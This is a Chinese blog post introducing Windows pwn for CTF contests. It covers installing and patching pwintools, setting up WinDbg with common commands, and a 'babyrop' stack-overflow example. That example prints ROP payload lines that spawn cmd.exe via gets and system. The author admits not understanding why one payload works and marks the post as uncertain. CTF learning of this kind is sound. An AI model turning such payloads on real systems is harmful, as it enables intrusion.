---
layout: post
title:  "Windows Pwn 入门"
categories: Windows pwn 
tags: pwn
author: ble55ing
---

* content
{:toc}
## Windows Pwn 入门 

ctf比赛中的Windwos Pwn题目愈发的多了，学一波

### Pwintools

工欲善其事，必先利其器。如果能在windows上有类似linux的调试环境那就比较舒服了。

<https://github.com/masthoon/pwintools> Windows上的pwntools

#### 安装psutil 

有人说需要安，所以就安了

<https://pypi.python.org/packages/b9/aa/b779310ee8a120b5bb90880d22e7b3869f98f7a30381a71188c6fb7ff4a6/psutil-5.2.2.win32-py2.7.exe#md5=2068931b6b2ecd9374f9fc5fe0da652f> 

#### Python for Windwos

按照pwintools官网上的介绍，需要这个，所以安一下

https://github.com/hakril/PythonForWindows> 

#### 修改request：

pwintools需求Python for Windwos版本0.4，但github上是0.5了，所以就会报错，使用Notepad++查找包中的PythonForWindows==0.4，改成==0.5（我下载的版本是0.5），就能够成功安装完成了

#### Pwintools修改

pwintools和pwntools还是有一些区别的，可以修改pwintools里的一些东西然后再重新安一下满足需求。注意要将Python27\Lib\site-packages\PWiNTOOLS-0.3-py2.7.egg删除，pwintools-master\build\lib里的文件删除，再进行setup

我的修改：

class Process中的self.debuggerpath改为了我的windbg地址

添加sendlineafter(self, delim, line)

修改recvuntil(self, delim, timeout = None,drop =False)，添加了drop

修改p32(i)和u32(i)的struct.pack('<I', i)参数由<i到<I。

#### 常用指令

```p =Process("babyrop.exe")```

```
io.spawn_debugger()
raw_input("DEBUG: ")
```

### Windbg

官网安装

<https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools> 

下载这个Download WinDbg Preview from the Microsoft Store: [WinDbg Preview](https://www.microsoft.com/store/p/windbg/9pgjgd53tn86). 

安装。我的默认安装到了G盘，注意需要去pwintools里其改一下。

#### Windbg常用命令

F5 /g 	继续执行，类似gdb的c

F8 		单步执行，类似gdb的s

F10		单步执行，类似gdb的n

lm		列出各模块的加载基址，类似于vmmap

F9/bp	下断点，如bp 0x2a1070

bl		查看所有断点，可删除

.reload	加载程序符号表

d		查看内存数据，类似gdb的x ，用法d 0x

### 一个小例子

babyrop，一个简单栈溢出

```
payload = "0" * 0xcc + 'aaaa' + p32(system) + 'cccc' + p32(cmd)
```

这样的payload就不能成功

```
payload = "0" * 0xcc + 'aaaa' 
payload += p32(gets) + p32(pecx) + p32(cmd) 
payload += p32(system) + 'bbbb' + p32(cmd)
...
io.sendline("cmd.exe")
```

这样的payload就能成功，原因不明，第一种的cmd.exe在内存中后面只有一个/x00，之后都是数据，第二种的后面全是/x00

第一篇文章，存疑

